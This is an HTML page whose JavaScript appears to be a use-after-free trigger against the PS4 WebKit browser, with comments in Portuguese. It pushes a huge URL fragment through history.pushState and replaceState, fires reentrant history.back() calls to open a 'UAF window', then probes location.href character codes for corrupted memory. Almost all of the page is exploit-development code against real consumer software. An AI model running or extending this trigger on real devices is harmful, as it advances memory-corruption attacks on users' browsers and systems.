<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 WebKit – UAF Trigger Integrated Test</title>
</head>
<body>

<h3>UAF Integrated Trigger + Probe</h3>
<button onclick="runTest()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(s) {
    document.getElementById("log").textContent += s + "\n";
}

function sleep(t) {
    return new Promise(r => setTimeout(r, t));
}

async function triggerUAF() {
    log("=== UAF TRIGGER START ===");

    // Valores EXATOS já confirmados por você
    const BIG_LEN = 340356;
    const BIG_FRAG = "A".repeat(BIG_LEN);

    // Estado inicial (baseline)
    history.replaceState({i:47}, "", "#INIT");

    // Estado A — fragment grande
    history.pushState({A:1}, "", "#" + BIG_FRAG);

    // Estado B — fragment pequeno
    history.replaceState({B:2}, "", "#X");

    // Janela crítica reentrante (PRESSÃO REAL)
    for (let i = 0; i <= 42; i += 6) {
        history.back();
        log("[ITER " + i + "] back() async");
        await sleep(0);
    }

    log(">>> UAF WINDOW <<<");
}

function probe(label) {
    let s = location.href;
    log(label + " URL.length = " + s.length);

    [32,64,128,256,512,1024].forEach(o => {
        try {
            log(label + " charCodeAt(" + o + ") = " + s.charCodeAt(o));
        } catch(e) {
            log(label + " charCodeAt(" + o + ") = EXC");
        }
    });
}

async function runTest() {
    document.getElementById("log").textContent = "";

    // Baseline consistente
    let base = "A".repeat(340356);
    history.replaceState({base:1}, "", "#" + base);

    log("=== BASELINE READ ===");
    probe("[BASE]");

    // TRIGGER REAL
    await triggerUAF();

    // Colapso explícito (como nos testes válidos)
    log(">>> FRAGMENT COLLAPSE <<<");
    history.replaceState({C:3}, "", "#S");

    // Probe imediato (mesmo frame)
    log("=== POST-COLLAPSE (SAME FRAME) ===");
    probe("[POST]");

    // Probe tardio
    await sleep(50);
    log("=== POST-COLLAPSE (DELAYED) ===");
    probe("[DELAY]");

    log("=== TEST END ===");
}
</script>

</body>
</html>
